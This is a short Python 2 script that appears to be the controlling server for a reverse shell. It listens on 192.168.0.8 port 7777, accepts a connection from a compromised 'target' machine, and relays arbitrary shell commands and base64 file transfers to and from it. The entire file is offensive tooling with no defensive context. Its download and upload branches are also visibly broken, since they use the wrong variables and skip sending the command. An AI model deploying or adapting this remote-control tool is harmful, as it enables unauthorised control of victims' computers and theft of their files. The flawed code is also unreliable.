#!/usr/bin/python2
#_*_ coding: utf8 _*_

import socket
import base64

def shell(): 
    current_dir = target.recv(1024)
    while True:
        comando = raw_input("{}-#: ".format(current_dir))
        if comando == "exit":
            target.send(comando)
            break
        elif comando[:2] == "cd":
            target.send(comando)
            res = target.recv(1024)
            current_dir = res
            print(res)
        elif comando == "":
            pass
        elif comando[:8] == "download":
            with open(comando,'wb') as file_download:
                datos = target.recv(1024)
                file_download.write(base64.b64decode(datos))
        elif comando[:6] == "upload":
            try:
                target.send(comando)
                with open(res[7:],'rb') as file_upload:
                    target.send(base64.b64encode(datos))
            except:
                print("Ocurrio un error en la subida del archivo...")
        else:
            target.send(comando)
            res = target.recv(1024)
            if res == "1":
                continue
            else: 
                print(res)


def upServer():

    global target
    global ip 
    global server

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    server.bind(('192.168.0.8', 7777))
    server.listen(1)

    print("Server running and waiting for connections...")

    target, ip = server.accept()

    print("Connection received from: " + str(ip[0]))

upServer()
shell()
server.close()
